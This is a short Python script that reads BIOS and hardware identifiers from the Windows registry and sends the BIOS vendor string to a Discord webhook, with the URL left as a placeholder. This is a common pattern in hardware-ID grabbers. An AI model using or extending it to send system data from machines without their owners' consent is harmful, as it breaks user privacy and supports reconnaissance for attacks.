import winreg
from discord_webhook import DiscordWebhook


webhook = "discord.com/...." #put webhook link here

##########FUNCTION FOR GETTING THE REGISTRY KEY############
def get_registry_value(path, name="", start_key = None):
    if isinstance(path, str):
        path = path.split("\\")
    if start_key is None:
        start_key = getattr(winreg, path[0])
        return get_registry_value(path[1:], name, start_key)
    else:
        subkey = path.pop(0)
    with winreg.OpenKey(start_key, subkey) as handle:
        assert handle
        if path:
            return get_registry_value(path, name, handle)
        else:
            desc, i = None, 0
            while not desc or desc[0] != name:
                desc = winreg.EnumValue(handle, i)
                i += 1
            return desc[1]
##########FUNCTION FOR GETTING THE REGISTRY KEY############

###########READING THE REGISTRY KEYS##########
bios_vendor = get_registry_value(r"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVendor")
bios_manufacturer = get_registry_value(r"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardManufacturer")
bios_version = get_registry_value(r"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVersion")
adapter_id = get_registry_value(r"HKEY_LOCAL_MACHINE\SOFTWARE\Intel\PSIS\PSIS_DECODER", "AdapterID")
###########READING THE REGISTRY KEYS##########

#########SENDIG THE WEBHOOK MESSAGE#########
webhookSend = DiscordWebhook(url=webhook, content=bios_vendor)
response = webhookSend.execute()
#########SENDIG THE WEBHOOK MESSAGE#########